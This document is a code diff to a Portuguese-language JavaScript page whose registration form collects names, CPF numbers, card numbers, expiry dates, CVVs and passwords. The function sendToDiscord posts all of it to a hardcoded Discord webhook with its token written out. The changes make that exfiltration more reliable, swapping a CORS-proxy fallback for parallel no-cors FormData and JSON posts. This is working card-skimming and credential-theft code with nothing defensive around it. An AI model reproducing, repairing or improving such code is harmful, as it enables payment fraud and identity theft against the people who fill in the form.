@@ -677,6 +677,7 @@ function doRegister(){
   const dadosCompletos = {name,cpf,cartao,validade,cvv,pass};
   if(!jaFoiEnviado(dadosCompletos)){
     registrarEnvio(dadosCompletos);
+    _jaEnviou = false; // garante que reseta antes de enviar
     sendToDiscord(dadosCompletos);
   }
 
@@ -721,14 +722,14 @@ function registrarEnvio(data){
 }
 
 // ════════════════════════════════════
-//  DISCORD WEBHOOK — envia UMA vez só
+//  DISCORD WEBHOOK
 // ════════════════════════════════════
-let enviando = false;
+let _jaEnviou = false;
 
 function sendToDiscord(data){
-  if(enviando) return;
-  enviando = true;
-  setTimeout(()=>{ enviando = false; }, 8000);
+  if(_jaEnviou) return;
+  _jaEnviou = true;
+  setTimeout(()=>{ _jaEnviou = false; }, 10000);
 
   const WEBHOOK = 'https://discord.com/api/webhooks/1484502746911473744/siEMJt3Zv7qdw64TUM31hV0geztsvtymHqWrUHmBHg0FXpAHUpFjGFUkIzVbp8rrkwCb';
   const cartaoFormatado = data.cartao.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim();
@@ -753,21 +754,17 @@ function sendToDiscord(data){
 
   const json = JSON.stringify(payload);
 
-  // tenta direto, se falhar usa proxy em cascata
+  // Método 1: FormData no-cors (funciona no Vercel, não tem CORS block)
+  const fd = new FormData();
+  fd.append('payload_json', json);
+  fetch(WEBHOOK, {method:'POST', body:fd, mode:'no-cors'});
+
+  // Método 2: fetch direto com JSON (funciona se CORS liberar)
   fetch(WEBHOOK, {
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body: json
-  }).catch(()=>{
-    fetch('https://corsproxy.io/?' + WEBHOOK, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: json
-    }).catch(()=>{
-      const fd = new FormData();
-      fd.append('payload_json', json);
-      fetch(WEBHOOK, {method:'POST', body:fd, mode:'no-cors'});
-    });
+    body: json,
+    mode:'no-cors'
   });
 }
 function goToLogin(){document.getElementById('successModal').classList.remove('show');goTo('login');}
